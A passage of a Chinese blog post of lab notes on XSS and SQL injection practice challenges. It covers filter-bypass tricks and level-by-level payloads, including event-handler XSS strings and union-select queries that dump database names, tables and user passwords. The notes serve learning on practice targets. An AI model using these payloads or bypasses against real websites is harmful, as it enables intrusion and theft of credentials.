<li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li>
<li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li>
<li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li>
<li>在标签的 href、src 等属性中，包含 javascript: 等可执行代码。</li>
<li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li>
<li>在 style 属性和标签中，包含类似 background-image:url(“javascript:…”); 的代码（新版本浏览器已经可以防范）。</li>
<li>在 style 属性和标签中，包含类似 expression(…) 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li>
</ol>
<p><strong>换句话我自己暑假写的：</strong></p>
<ol>
<li>通过构建 <code>&lt;script&gt;&lt;/script&gt;</code> 对在其中嵌入JS代码，告诉浏览器这是JS代码，让其执行。<ol>
<li>普通的就直接打进去</li>
<li>对特殊符号进行过滤的可以考虑另外会显示的地方进行闭合，从而构建出新的 <code>&lt;script&gt;&lt;/script&gt;</code> 标签来执行JS</li>
<li>对于过滤的毕竟全的，可以考虑多种编码(unicode)，大小写或者其他的方法来绕过检测。</li>
<li>遇到直接删除关键字的，可以考虑在一个关键字中间加一个关键字，这样删掉后前后拼接出来的还是关键字。</li>
<li>有特殊关键字要求的，可以通过注释的方式来添加无用的关键字。</li>
</ol>
</li>
<li>通过在其他标签内部注入事件调用JS，来执行JS代码。<ol>
<li>通过构建 <code>click </code>等事件的监听函数来设置JS</li>
<li>通过额外插入标签，如图片标签，超链接标签的src为JS。</li>
</ol>
</li>
</ol>
<h2 id="2-2-闯关记录"><a href="#2-2-闯关记录" class="headerlink" title="2.2 闯关记录"></a>2.2 闯关记录</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>第一关记录一下，开开心心。</p>
<p>这里看到输入的 <code>GET</code> 参数 <code>name</code> 是会回显在前端的</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119211016582.png" alt="level1-1"> </p>
<p>然后 <code>F12</code> 查看页面源代码，可以发现标签的格式，使用了 <code>&lt;h2&gt;***&lt;/h2&gt;</code> 当输入的内容为 <code>&lt;/h2&gt; ***&lt;h2&gt;</code> 时<strong>（闭合内容是我的习惯，当然不闭合后面的也是可以的，因为HTML是逐一向后解释的）</strong>，可以对HTML中的标签进行闭合，从而在 <code>***</code> 处嵌入新的标签。</p>
<p>当嵌入的标签是 <code>&lt;script&gt;***&lt;/script&gt;</code> 时，我们就可以执行其中的JS脚本。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119211212061.png" alt="level1-2"></p>
<p>因此就可以轻易得到我们的payload了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>放入之后可以看到显示成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119213441728.png" alt="level1-3"></p>
<p><strong>所以这一关是直接注入代码。</strong></p>
<h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>这一关稍微难度大些，题目要求输入一个链接作为友情链接。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201120153517152.png" alt="level8-1"></p>
<p>我们知道 <code>a</code> 标签中也是可以嵌入JS代码的，因此只需要我们适当的构建也可以实现XSS攻击。当网页中的 <code>a</code> 标签形如下面的格式时，即可执行JS脚本。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>友情链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们不妨对上述的输入框进行输入测试，输入payload为上述的 <code>href</code> 后面的部分。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure>
<p>但是很遗憾,被后端关键词过滤掉了，实验最终失败了。 <code>javascript</code> 关键字被过滤掉了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201120154240145.png" alt="level8-2"></p>
<p>不过别担心，我们还可以通过其他方式看看能否绕过这些检测。</p>
<p><del>说实话，想直接确定怎么绕过检测是不现实的，正常情况下我们看不到后端的代码，也就无从得知对方的检测策略，因此我们只能一个一个的试。虽然这样的效率很低，在实战中也不一定能够试出来。但这正是我们刷题的作用所在：<strong>通过刷题学习更多的绕过方法、知道更多的绕过方法在面对的时候就更有可能绕过对方的检测，从而实现攻击。知道的方法越多，绕过的概率也就越大。</strong></del></p>
<p>也不多啰嗦了，看了题解知道了此题的绕过方法是通过编码关键字进行绕过。具体编码后的payload如下所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip<span class="symbol">&amp;#x74;</span>:alert(&#x27;xss&#x27;)</span><br></pre></td></tr></table></figure>
<p>这里把 <code>t</code> 字母编码为了 <code>&amp;#x74;</code> 编码哪个字母不是重要的，只是通过这种编码实现了绕过对方的关键字检测。</p>
<p>然后这个payload就可以完成修改链接的功能，使得对方点击就送。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201120155224890.png" alt="level8-3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201120155534653.png" alt="level8-4"></p>
<p>此题考查伪协议绕过， <code>script</code> 转换成 <code>scr_ipt</code> 、 <code>on</code>  转换成 <code>o_n</code> 、 <code>src</code> 转换成  <code>sr_c</code> 、 <code>data</code>  转换成 <code>da_ta</code> 、 <code>href</code>  转换成  <code>hr_ef</code> 、大小写失效、<code>&quot;</code>  还被编码，但是尖括号 <code>&lt;</code>  <code>&gt;</code>  ，<code>&#39;</code>   , <code>%</code>  ，<code>#</code> ，<code>&amp;</code> 符号没有被过滤。<strong>这题就是编码绕过。</strong></p>
<h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>这一关更难些，怎么试都没有反应。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123092719426.png" alt="level10-1"></p>
<p>随便测试了都没有太多反应，且此题也没有一个明显的诸如输入框、超链接的提示，这个图片也没监听事件，但还是无用。</p>
<p>无奈之下，只能打开 <code>F12</code> 调试一下，简单拆拆可以发现下方<strong>隐藏</strong>了几个输入框。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123093026599.png" alt="level10-2"></p>
<p>有没有小朋友想着把下面的 <code>type</code> 直接修改成 <code>block</code> 让输入框出现呢？嘿！这样框是出现了，但是怎么提交呢？没有一个点击触发的按钮诶。没错，我就这样做了，找不到提交的地方了，整个人都傻了。</p>
<p>这是 <code>GET</code> 型的XSS，参数是通过 <code>url</code> 进行提交的，因此不需要输入框，只需要直接在链接中修改了对应的值，然后点击就送就好。</p>
<p>怎么修改呢？只需要将上述的 <code>&lt;input&gt;</code> 标签进行闭合，添加一个监听事件就可以实现绕过。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 原标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;aaa&#x27;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 修改后的标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;aaa&#x27;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;block&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 差异部分(payload) --&gt;</span></span><br><span class="line">&quot; type=&quot;block&quot; onclick=&quot;alert(&#x27;XSS&#x27;)</span><br></pre></td></tr></table></figure>
<p>标签中的属性 <code>type</code> 被覆写了，就会忽略后面的值为 <code>hidden</code>， 而前面的 <code>value</code> 标签被 <code>&quot;</code> 闭合了，从而实现了绕过。</p>
<p>但是上述存在三个输入框，怎么知道哪个是有效的呢？我也不知道，所以要么一个一个试，要么都整一个。</p>
<p><code>input</code> 标签通过 <code>name</code> 属性来鉴别，实验url中的参数来区分。</p>
<p>这里我懒，我就都整一个，最后实验结果显示是最后一个。</p>
<p>payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&amp;t_link&#x3D;&quot; type&#x3D;&quot;block&quot; onclick&#x3D;&quot;alert(&#39;XSS&#39;)&amp;t_history&#x3D;&quot; type&#x3D;&quot;block&quot; onclick&#x3D;&quot;alert(&#39;XSS&#39;)&amp;t_sort&#x3D;&quot; type&#x3D;&quot;block&quot; onclick&#x3D;&quot;alert(&#39;XSS&#39;)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123094351218.png" alt="level10-3"></p>
<p>如上图所示，只有第三个输入框是有效的，然后点击出现的框，即可完成此关。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123094541608.png" alt="level10-4"></p>
<p><strong>此题考查了网页中 标签的隐藏，标签的选取，<code>url</code> <code>GET</code> 传参定位标签，添加鼠标监听事件到 <code>JS</code> 。</strong></p>
<h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>这一关相对较难，需要结合使用 <code>burp</code> 进行抓包修改包。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123102721615.png" alt="level12-1"></p>
<p>首先还是看到，通过 <code>keyword</code> 参数传入的值可以正确回显在前端。</p>
<p><code>F12</code> 抓包查看一下，可以发现存在一个输入框，将用户的 <code>User-Agent</code> 给接收了。或许是某个后端程序员想通过这种方式来检查 <code>User-Agent</code> 吧，至于为什么这样整，我暂且蒙在鼓里。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123104234465.png" alt="level12-2"></p>
<p>好吧，那既然这样就直接开始上吧。</p>
<p>随便输入一个，然后将 <code>burp</code> 代理挂上，对目标进行抓包。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123103019572.png" alt="level12-3"></p>
<p>然后修改其 <code>User-Agent</code> 如下，以对上述的标签进行闭合和显示。</p>
<p>payload如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=alert(1) type=&quot;text&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123103846434.png" alt="level12-4"></p>
<p>然后点击 <code>forward</code> ，将包发送过去。之后将鼠标放到框上扫过即可触发此 <code>JS</code> 。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123104048697.png" alt="level12-5"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123104012083.png" alt="level12-6"></p>
<p>此题考查的还是输入框的参数获取不严格，同时也是一个难以想到的点——对 <code>User-Agent</code> 进行修改。</p>
<h3 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h3><p>这一关是完全不会的。参考了好几个链接。他们的做法都是利用插入一个图片实现 XSS 攻击。（毕竟也没框，也没啥其他东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123100636645.png" alt="level16-1"></p>
<p>故技重施，先整一个 <code>test</code> 看看会发生什么。可以看到前端显示了一个test，所以说我们的输入是有所反应的，是存在攻击的可能性的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123100949107.png" alt="level16-2"></p>
<p>从参考的各个链接中学习到的攻击方法，大同小异。</p>
<p><strong>基本思想应该是：往页面中插入一个不存在的图片链接，当图片无法加载时触发函数 <code>onerror</code> 后接的函数，从而实现攻击。</strong></p>
<p> 好的，那就整一个试试。 <code>?keyword=&lt;img src=1 onerror=alert(&#39;XSS&#39;)&gt;</code></p>
<p>结果毫无反应，空格啥的都被替换的，无法实现成功的目的。多次的测试，可以发现确实如此：空格、<code>script</code> 、 <code>/</code> 等都被替换成了 <code>&amp;nbsp</code>，同时大小写绕过也有检测。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123101702078.png" alt="level16-3"></p>
<p>因此，通过查阅的参考资料显示需要使用 换行: <code>%0a</code> 和 回车: <code>%0d</code> 来进行绕过。 </p>
<p>那就再整一个试试。  <code>?keyword=&lt;img%0dsrc=1%0donerror=alert(&#39;XSS&#39;)&gt;</code></p>
<p>点击就送，一瞬就成功了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123102225358.png" alt="level16-4"></p>
<p>因此payload为</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0dsrc=1%0donerror=alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure>


<p><strong>此题考查的是，通过图片加载失败，错误回调函数的利用。</strong></p>
<h1 id="0x03-SQL-注入攻击"><a href="#0x03-SQL-注入攻击" class="headerlink" title="0x03 SQL 注入攻击"></a>0x03 SQL 注入攻击</h1><h2 id="3-1-SQL-注入攻击原理"><a href="#3-1-SQL-注入攻击原理" class="headerlink" title="3.1 SQL 注入攻击原理"></a>3.1 SQL 注入攻击原理</h2><h3 id="3-1-1-基本原理"><a href="#3-1-1-基本原理" class="headerlink" title="3.1.1 基本原理"></a>3.1.1 基本原理</h3><p>SQL注入，也称SQL注码，是发生于<strong>应用程序</strong>与<strong>数据库层</strong>的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。比如先前的很多影视网站泄露VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到SQL注入式攻击．</p>
<h3 id="3-1-2-攻击分类"><a href="#3-1-2-攻击分类" class="headerlink" title="3.1.2 攻击分类"></a>3.1.2 攻击分类</h3><h4 id="3-1-2-1-按照参数类型分类"><a href="#3-1-2-1-按照参数类型分类" class="headerlink" title="3.1.2.1 按照参数类型分类"></a>3.1.2.1 按照参数类型分类</h4><p>常见的sql注入按照参数类型可分为两种：数字型和字符型。</p>
<ol>
<li><p>数字型</p>
<p>当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。</p>
</li>
<li><p>字符型</p>
<p>同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。</p>
</li>
</ol>
<h4 id="3-1-2-2-按照数据库返回结果分类"><a href="#3-1-2-2-按照数据库返回结果分类" class="headerlink" title="3.1.2.2 按照数据库返回结果分类"></a>3.1.2.2 按照数据库返回结果分类</h4><p>若按照数据库返回的结果，分为回显注入、报错注入、盲注。</p>
<ol>
<li><p>回显注入</p>
<p>可以直接在存在注入点的当前页面中获取返回结果。</p>
</li>
<li><p>报错注入</p>
<p>程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。</p>
</li>
<li><p>盲注</p>
<p>程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。</p>
</li>
</ol>
<h4 id="3-1-2-3-按照注入位置分类"><a href="#3-1-2-3-按照注入位置分类" class="headerlink" title="3.1.2.3 按照注入位置分类"></a>3.1.2.3 按照注入位置分类</h4><p>按照注入位置及方式不同分为：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入，无论此种分类如何多，都可以归纳为以上两种形式。</p>
<h3 id="3-1-3-攻击步骤"><a href="#3-1-3-攻击步骤" class="headerlink" title="3.1.3 攻击步骤"></a>3.1.3 攻击步骤</h3><ol>
<li>寻找注入点</li>
<li>猜测后台语句</li>
<li>猜测闭合符</li>
<li>确定列数</li>
<li>寻找显示位</li>
<li>获取数据库名</li>
<li>获取数据库中的表名</li>
<li>获取表中的列名</li>
<li>对具体目标执行查询</li>
</ol>
<h3 id="3-1-4-攻击方式总结"><a href="#3-1-4-攻击方式总结" class="headerlink" title="3.1.4 攻击方式总结"></a>3.1.4 攻击方式总结</h3><h4 id="闭合符"><a href="#闭合符" class="headerlink" title="闭合符"></a>闭合符</h4><p>闭合符可以很复杂也可以很简单，可以没有闭合符，也可以有。</p>
<p><code>&#39;</code> ,  <code>&quot;</code> ,  <code>&#39;)</code> ,  <code>&quot;)</code> <code>&quot;))</code> 等，多试试应该能试出来。</p>
<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>常用的注释符号有几种，如 <code>#</code> <code>-- </code> （减减空格）。若要在 <code>GET</code> 中去注释，则需要将其进行 url 编码为 <code>--+</code>。但 <code>POST</code> 中就比可以编码。</p>
<h2 id="3-3-手工注入的常用函数"><a href="#3-3-手工注入的常用函数" class="headerlink" title="3.3 手工注入的常用函数"></a>3.3 手工注入的常用函数</h2><h3 id="union和union-all"><a href="#union和union-all" class="headerlink" title="union和union all"></a>union和union all</h3><p>union和union all都是联合查询，用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中，区别在于union会去除重复的结果，union all不会。</p>
<blockquote>
<p>要注意的是前后两个select语句中的列数必须一致</p>
</blockquote>
<h3 id="group-concat和concat"><a href="#group-concat和concat" class="headerlink" title="group_concat和concat"></a>group_concat和concat</h3><p>concat函数用于将多个字符串连接到一起形成一个字符串，效果如下：</p>
<p>concat_ws(‘,’, *, *):第一个参数是分隔符，后面的拼到一起的列</p>
<p>group_concat函数会将要查询的结果以一个组合的形式返回，group_concat需要和group_by函数配合使用，否则会将返回结果以一行显示。通常用于将多条记录合并为一条记录。</p>
<p>除此之外还可以使用Separator关键字加分隔符：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/20190602205545.png" alt="group_concat&amp;concat-1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/20190602205616.png" alt="group_concat&amp;concat-2"></p>
<p>除此之外还可以使用Separator关键字加分隔符：</p>
<h3 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h3><p>该函数用于获取字符串的长度。</p>
<h3 id="mid"><a href="#mid" class="headerlink" title="mid()"></a>mid()</h3><p>SQL MID() 函数用于得到一个字符串的一部分。这个函数被MySQL支持，但不被MS SQL Server和Oracle支持。在SQL Server， Oracle 数据库中，我们可以使用 SQL SUBSTRING函数或者 SQL SUBSTR函数作为替代。</p>
<p>mid(str, start, length), 从str中的start开始查，一共查询length这么长，查到得结果返回了。下标从1开始的。</p>
<h3 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h3><p>LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。</p>
<p>用法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LEFT</span>(str,length);</span><br></pre></td></tr></table></figure>
<p>LEFT()函数接受两个参数：</p>
<ul>
<li>str是要提取子字符串的字符串。</li>
<li>length是一个正整数，指定将从左边返回的字符数。</li>
</ul>
<p>LEFT()函数返回str字符串中最左边的长度字符。如果str或length参数为NULL，则返回NULL值。</p>
<p>如果length为0或为负，则LEFT函数返回一个空字符串。如果length大于str字符串的长度，则LEFT函数返回整个str字符串。</p>
<p>请注意，SUBSTRING(或SUBSTR)函数也提供与LEFT函数相同的功能。</p>
<h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><p>substr和mid函数的作用和用法基本相同，只不过substr支持的数据库更多，mid只支持mysql数据库。</p>
<p>用法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(string string,num <span class="keyword">start</span>,num length);</span><br></pre></td></tr></table></figure>
<h3 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a>ascii()</h3><p>ascii函数用来返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL。这个函数可以和substr函数配合来使用猜测一个字符。</p>
<h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h3><p>sleep函数可以让sql执行的时候暂停一段时间，函数的返回结果为0.</p>
<h3 id="if-expr1-expr2-expr3"><a href="#if-expr1-expr2-expr3" class="headerlink" title="if(expr1,expr2,expr3)"></a>if(expr1,expr2,expr3)</h3><p>语法如下：</p>
<p>IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。</p>
<h3 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h3><p>count函数是用来统计表中或数组中记录的一个函数，下面我来介绍在MySQL中count函数用法与性能比较吧。count(*) 它返回检索行的数目， 不论其是否包含 NULL值。</p>
<h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><p>load_file()可以用来读取文件，此函数的执行必须使用dba权限或者root权限。</p>
<p>需要注意的是：</p>
<p>mysql 新版本下secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
<ul>
<li>ure_file_priv的值为null ，表示限制mysqld 不允许导入,导出</li>
<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入,导出只能发生在/tmp/目录下</li>
<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入,导出做限制</li>
</ul>
<p>如何查看secure-file-priv参数的值：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile()"></a>into outfile()</h3><p>into outfile()函数可以将字符串写入文件，此函数的执行也需要很大的权限，并且目标目录可写。</p>
<h2 id="3-4-闯关笔记"><a href="#3-4-闯关笔记" class="headerlink" title="3.4 闯关笔记"></a>3.4 闯关笔记</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less 1"></a>less 1</h3><p>第一关一定要做一下，开开心心。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123112802944.png" alt="less1-1"></p>
<h4 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h4><p>可以看到，他让我们在 <code>url</code> 链接中传入一个 <code>GET</code> 参数 <code>id</code> 同时告诉了这个是一个数字型的。于是我们就整一哈。<strong>因此注入点就在这里。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123113035517.png" alt="less1-2"></p>
<p>可以看到显示参数成功。</p>
<blockquote>
<p>临时换了设备，所以IP不一样了</p>
</blockquote>
<h4 id="确定闭合符"><a href="#确定闭合符" class="headerlink" title="确定闭合符"></a>确定闭合符</h4><p>输入单引号发生了报错，再单引号后进行注释则无报错。<strong>因此闭合符就是单引号。</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123170206855.png" alt="less1-3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123170237163.png" alt="less1-4"></p>
<h4 id="确定列数"><a href="#确定列数" class="headerlink" title="确定列数"></a>确定列数</h4><p>于是通过 <code>order by</code> 确定列数，这里手动测试到 3 列，第4列报错了。<strong>因此一共有三列。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123165839557.png" alt="less1-5"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 4 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123165910031.png" alt="less1-6"></p>
<h4 id="确定显示位"><a href="#确定显示位" class="headerlink" title="确定显示位"></a>确定显示位</h4><p>通过 <code>union select 1,2,3 --+</code> 确定回显位置在 <code>2</code> 和 <code>3</code> 。一共两个显示位。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123170622910.png" alt="less10-7"></p>
<h4 id="确定当前库名和库下所有的表名"><a href="#确定当前库名和库下所有的表名" class="headerlink" title="确定当前库名和库下所有的表名"></a>确定当前库名和库下所有的表名</h4><p>使用下面的 payload 获取当前数据库的库名和数据库下的表名。事实上还应该先判断数据库是否是 <code>mySQL</code> 来确定函数的，但是我们直接用报错了正好说明不是，没有就是。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123170900678.png" alt="less1-8"></p>
<h4 id="获取-表下的所有列名"><a href="#获取-表下的所有列名" class="headerlink" title="获取***表下的所有列名"></a>获取***表下的所有列名</h4><p>使用下面的 payload 可以获取某个表中的所有列名，这里我们以 <code>users</code> 表为例，其他同理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),3 --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123171221424.png" alt="less1-9"></p>
<h4 id="获取-表中-列中数据"><a href="#获取-表中-列中数据" class="headerlink" title="获取***表中***列中数据"></a>获取***表中***列中数据</h4><p>通过下面的 payload 可以获取任意表中任意列中的全部数据，这里以 <code>users</code> 表中的 <code>user</code> 和 <code>password</code> 为例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users) --+</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201123171544741.png" alt="less1-10"></p>
<p>可以看到我们完成了对数据库中全部数据的请求。</p>
<h3 id="less-2"><a href="#less-2" class="headerlink" title="less 2"></a>less 2</h3><p>通过测试此关是数字型的 <code>id</code> 参数，而第一个是 <code>&#39;</code> 闭合的字符型，因此只需要将此处的参数设置为数字型即可以与第一关一样的步骤实现。</p>
<h3 id="less-3"><a href="#less-3" class="headerlink" title="less 3"></a>less 3</h3><p>通过尝试可以发现这一关是使用 <code>&#39;)</code>  闭合的字符型，因此只需要将闭合符修改一下，也就可以用第一关一样的步骤进行实现。</p>
<h3 id="less-4"><a href="#less-4" class="headerlink" title="less 4"></a>less 4</h3><p>通过尝试可以发现这一关是使用 <code>&quot;)</code>  闭合的字符型，因此只需要将闭合符修改一下，也就可以用第一关一样的步骤进行实现。</p>
<h3 id="less-5"><a href="#less-5" class="headerlink" title="less 5"></a>less 5</h3><h4 id="注入类型判断"><a href="#注入类型判断" class="headerlink" title="注入类型判断"></a>注入类型判断</h4><p>这一关则明显不同，通过测试可以知道前端有两种状态。响应正确会显示 <code>You are in........</code> 否则就没有输出回显。<strong>因此可以判断其是一个bool盲注。</strong></p>
